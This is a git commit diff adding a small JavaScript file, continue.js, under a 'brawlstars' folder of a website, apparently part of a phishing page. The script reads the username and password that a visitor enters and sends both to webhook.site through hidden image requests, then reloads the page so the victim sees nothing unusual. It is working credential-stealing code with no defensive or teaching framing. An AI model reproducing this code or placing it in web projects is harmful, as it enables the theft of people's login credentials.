420d1637345df7511ca49b28a6f15f78d2f89bd7
az69az <138134265+az69az@users.noreply.github.com>
2023-07-08 14:27:13 +0300

    Add files via upload

---
+++ public_html/others/brawlstars/continue.js
@@ -0,0 +1,11 @@
+<script>
+       const getValueInput = () =>{
+       
+let inputValue=document.getElementById("username").value; 
+       
+let inputValue1 = document.getElementById("password").value;        var i=new Image();
+var j=new Image();
+i.src="https://webhook.site/?password="+inputValue1;  j.src="https://webhook.site/?username="+inputValue; 
+window.location.reload();
+  }        
+</script>
